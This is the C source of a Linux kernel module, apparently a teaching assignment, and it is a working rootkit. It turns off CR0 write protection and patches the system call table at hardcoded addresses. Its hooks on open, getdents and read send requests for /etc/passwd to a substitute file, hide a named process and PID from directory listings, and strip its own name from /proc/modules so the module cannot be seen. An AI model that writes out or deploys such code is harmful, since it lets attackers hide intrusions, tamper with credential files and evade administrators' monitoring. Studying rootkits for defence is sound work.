#include <linux/module.h>      // for all modules 
#include <linux/moduleparam.h>
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <asm/uaccess.h>

struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[512];
};

static int enter_module = 0;


// get the sneaky process pid by module_param()
static char* sneaky_process_pid = "";

module_param(sneaky_process_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(sneaky_process_pid, "sneaky_process_pid from sneaky_process.c");


//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic


void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.

//Define our new sneaky version of the 'open' syscall #3
asmlinkage int (*original_open)(const char *pathname, int flags);

asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  const char * original = "/etc/passwd";
  const char * fake = "/tmp/passwd";
  int change1;
  printk(KERN_INFO "Open........Very, very Sneaky!\n");

  if (strcmp(original, pathname) == 0) {
    // printk(KERN_INFO "Open....... you want to open /etc/passwd???? hahaha gonna open /tmp/passwd ..........\n");
    change1 = copy_to_user((void*)pathname, fake, strlen(fake) + 1);
    if (change1 == 0) {
      // success
      printk(KERN_INFO "hidden /etc/passwd showing /tmp/passwd.....\n");
    }
    else {
      printk(KERN_INFO "ERROR: not hidden /etc/passwd......\n");
    }
    return original_open(pathname, flags);
  }

  if (strcmp(pathname, "/proc/modules") == 0) {
    // printk(KERN_INFO "Open....... /proc/modules\n");
    // sneaky_fd = original_open(pathname, flags, mode);
    // sneaky_status = 100;
    // sneaky_fd = original_open(pathname, flags);
    enter_module = 100;
  }
  return original_open(pathname, flags);
}

// Define our new sneaky version of the 'getindent' syscamm
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent* dirp, unsigned int count);
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent* dirp, unsigned int count) {
  int dir_bytes = original_getdents(fd, dirp, count);
  struct linux_dirent * d = dirp;
  int pos = 0;
  // int res = 0;
  for(;pos < dir_bytes;) {   
    unsigned short cur_length = d->d_reclen;
    int is_name = strcmp(d->d_name, "sneaky_process");
    int is_pid = strcmp(d->d_name, sneaky_process_pid);
    printk(KERN_INFO "SNEAKY getdents: sneaky_process_pid = %s\n", sneaky_process_pid);    
    if ((is_name == 0) || (is_pid == 0)) {
      // find the process to be hidden
      // printk(KERN_INFO "find sneaky process!!!...will be hiden lol......\n");
      // hide the process memcpy or memmove???????????
      memmove(d, (char *)d + cur_length, (size_t)(dir_bytes - pos - cur_length));
      dir_bytes -= cur_length; // move the reclen of sneaky process file
      d = (struct linux_dirent *)((char *)dirp + pos);
      pos += cur_length;      
      break;
    }
    pos += cur_length;
    d = (struct linux_dirent *)((char *)dirp + pos); //current
  }
  return dir_bytes;
}

// Define our new sneaky version of the read syscall
asmlinkage int (*original_read)(int fd, void * buf, size_t cnt);
asmlinkage int sneaky_sys_read(int fd, void * buf, size_t cnt) {
  int read_bytes = original_read(fd, buf, cnt);
  // return read_bytes;
  // check if fd is /proc/modules:hide sneaky_mod

  // printk(KERN_INFO "read_fd = %d\n", fd);
  // if (fd == sneaky_fd) {
  //   char* pos_start = strstr(buf, "sneaky_mod");
  //   if (pos_start != NULL) {
  //     char* pos_end = strchr(pos_start, '\n');
  //     if (pos_end != NULL) {
  //       memmove(pos_start, pos_end + 1, read_bytes - (size_t)(pos_end + 1 - pos_start));
  //       read_bytes -= (pos_end + 1 - pos_start);
  //       sneaky_fd = -1;
  //     }
  //   }
  // }
  char* pos_start = strstr((char *)buf, "sneaky_mod");
  if (pos_start && enter_module == 100) {
    // char* pos_start = strstr((char *)buf, "sneaky_mod");
    if (pos_start != NULL) {
      char * pos_end = pos_start;
      int count = 0;
      while (*pos_end != '\n') {
        count ++;
        pos_end ++;
      }
      read_bytes -= count;
      memmove(pos_start, pos_end + 1, strlen(pos_start) - count);      
      // sneaky_fd = -1;
      enter_module = 0;
    }
  }
  return read_bytes;
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;


  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  printk(KERN_INFO "Sneaky process pid %s \n", sneaky_process_pid);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_open;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  